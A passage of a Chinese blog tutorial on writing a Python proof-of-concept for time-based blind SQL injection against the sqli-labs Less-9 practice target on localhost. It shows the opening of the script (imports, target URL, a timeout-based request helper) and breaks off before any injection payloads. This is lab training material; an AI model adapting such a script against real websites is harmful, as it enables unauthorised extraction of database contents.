# 原创
：  37-5 基于时间的盲注 SQL 注入 PoC 的 Python 编写

# 37-5 基于时间的盲注 SQL 注入 PoC 的 Python 编写

攻击目标就用sql靶场的第9关，手注与靶场搭建：[22-5 SQL注入攻击 - 基于时间的盲注-CSDN博客](https://blog.csdn.net/weixin_43263566/article/details/135899475) 

<img alt="" height="412" src="https://img-blog.csdnimg.cn/direct/b17324ca745948baa9e5fa7cfc74dc1f.png" width="1158"/> 

#### poc 

```
import concurrent.futures  # 导入并发模块
import requests  # 导入发送HTTP请求的库
import string  # 导入处理字符串的库

url = "http://127.0.0.1/sqli-labs-master/Less-9/?id=1"  # 目标网站的URL
total_requests = 0  # 记录总请求数

timeout_limit = 5  # 设定等待时长


def timeout(url):
    """
    发送HTTP请求并返回响应或超时信息
    """
    global total_requests
    try:
        res = requests.get(url, timeout=timeout_limit)  # 发送GET请求，等待最多5秒钟
        total_requests += 1  # 每发送一次请求就增加一次总请求数
        return res.text  # 返回响应内容
    except Exception as e:
        return "timeout"  # 如果超时，则返回"time
```
